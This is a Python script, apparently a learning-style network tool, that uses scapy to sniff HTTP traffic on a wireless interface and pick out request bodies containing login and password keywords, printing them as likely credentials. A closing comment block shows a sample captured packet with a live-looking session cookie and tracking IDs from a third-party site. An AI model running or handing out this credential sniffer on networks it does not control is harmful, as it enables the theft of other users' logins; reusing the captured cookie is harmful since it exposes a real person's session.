#!/usr/bin/env python3


import scapy.all as scapy

from scapy.layers import http
import json
import urllib

from colorama import init, Fore
# initialize colorama
init()
# define colors
class Colors:
    GREEN = Fore.GREEN
    RED   = Fore.RED
    RESET = Fore.RESET

colors = Colors()



def string_to_dict(s):
    return json.dumps(
        { i.split("=")[0] : i.split("=")[1]  for i in s.split("&")}, indent=4
    )


def to_string(s):
    return bytes(s).decode(errors="backslashreplace")


def get_url(packet):
    # todo fix bug

    url = to_string(
        packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    )
    return urllib.parse.unquote( url )

def get_method(packet):

    return to_string(
        packet[http.HTTPRequest].Method
    )



def get_auth_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        
        # keywords
        keywords = ['username', 'user', 'login', 'password', 'pass']

        load_str = to_string(load).lower()

        for keyword in keywords:
            if keyword in load_str:
                return load



def print_packet_info(packet):
    print("\n")

    url = get_url(packet)
    method = get_method(packet)

    print(
f"""{"=" * 50}
[+] HTTP Request
 - {colors.GREEN}Request url{colors.RESET} -> {url}
 - {colors.GREEN}Request method{colors.RESET} -> {method}
"""
    )


    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        print("load - " + urllib.parse.unquote( to_string(load) ) )

    print("\n")


def process_sniff_packet(packet):
    # print(packet)

    if packet.haslayer(http.HTTPRequest):
        print_packet_info(packet)

        auth_info = get_auth_info(packet)

        if auth_info:
            print('\n\n\n'+('_' * 100)+'\n' + ('-' * 100))
            print('[+] Possible username/password >>> ' + to_string(auth_info))
            print('\n[+] dict >>> ' + string_to_dict( to_string(auth_info) ) )
            print(('-' * 100)+'\n\n\n')





def sniff(interface):
    print("running")
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)
    
    # scapy.sniff(prn=lambda x:x.summary(), iface=interface, store=False)







if __name__ == "__main__":
    sniff("wlo1")













"""







packet has several layers,

to check if packet has certain layer -> packet.haslayer({some_layer})

to get layer - packet[http.HTTPRequest]

to get all fields in certain layer - print( packet[http.HTTPRequest].show() )


Example:

###[ Ethernet ]### 
  dst       = d8:47:32:e9:f6:aa
  src       = 18:47:3d:d7:07:45
  type      = IPv4
###[ IP ]### 
     version   = 4
     ihl       = 5
     tos       = 0x0
     len       = 871
     id        = 46935
     flags     = DF
     frag      = 0
     ttl       = 64
     proto     = tcp
     chksum    = 0xec97
     src       = 192.168.0.106
     dst       = 77.221.132.178
     \options   \
###[ TCP ]### 
        sport     = 60508
        dport     = http
        seq       = 2738345159
        ack       = 2986755334
        dataofs   = 8
        reserved  = 0
        flags     = PA
        window    = 501
        chksum    = 0x2f09
        urgptr    = 0
        options   = [('NOP', None), ('NOP', None), ('Timestamp', (3954753694, 4051514954))]
###[ HTTP 1 ]### 
###[ HTTP Request ]### 
           Method    = 'GET'
           Path      = '/favicon.svg'
           Http_Version= 'HTTP/1.1'
           A_IM      = None
           Accept    = 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
           Accept_Charset= None
           Accept_Datetime= None
           Accept_Encoding= 'gzip, deflate'
           Accept_Language= 'en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7,es;q=0.6'
           Access_Control_Request_Headers= None
           Access_Control_Request_Method= None
           Authorization= None
           Cache_Control= None
           Connection= 'keep-alive'
           Content_Length= None
           Content_MD5= None
           Content_Type= None
           Cookie    = 'PHPSESSID=3sucgvd3brb3nerd9df21fphg4; _ym_uid=1668887759870381657; _ym_d=1668887759; tmr_lvid=f4983e19d0dad690119ab231743c1b0d; tmr_lvidTS=1668887760890; _ym_isad=1; _ym_visorc=w; _ga=GA1.2.768240427.1668887823; _gid=GA1.2.1227302248.1668887823; tmr_detect=1%7C1668889033233; tmr_reqNum=33'
           DNT       = None
           Date      = None
           Expect    = None
           Forwarded = None
           From      = None
           Front_End_Https= None
           HTTP2_Settings= None
           Host      = 'saechka.ru'
           If_Match  = None
           If_Modified_Since= 'Tue, 09 Aug 2022 14:30:44 GMT'
           If_None_Match= '"a9aa31-71b-5e5cfc70c0d00"'
           If_Range  = None
           If_Unmodified_Since= None
           Keep_Alive= None
           Max_Forwards= None
           Origin    = None
           Permanent = None
           Pragma    = None
           Proxy_Authorization= None
           Proxy_Connection= None
           Range     = None
           Referer   = 'http://saechka.ru/search/index.php?q=+%D1%87%D0%BE&how=%D1%84'
           Save_Data = None
           TE        = None
           Upgrade   = None
           Upgrade_Insecure_Requests= None
           Upgrade_Insecure_Requests= None
           User_Agent= 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
           Via       = None
           Warning   = None
           X_ATT_DeviceId= None
           X_Correlation_ID= None
           X_Csrf_Token= None
           X_Forwarded_For= None
           X_Forwarded_Host= None
           X_Forwarded_Proto= None
           X_Http_Method_Override= None
           X_Request_ID= None
           X_Requested_With= None
           X_UIDH    = None
           X_Wap_Profile= None
           Unknown_Headers= None


"""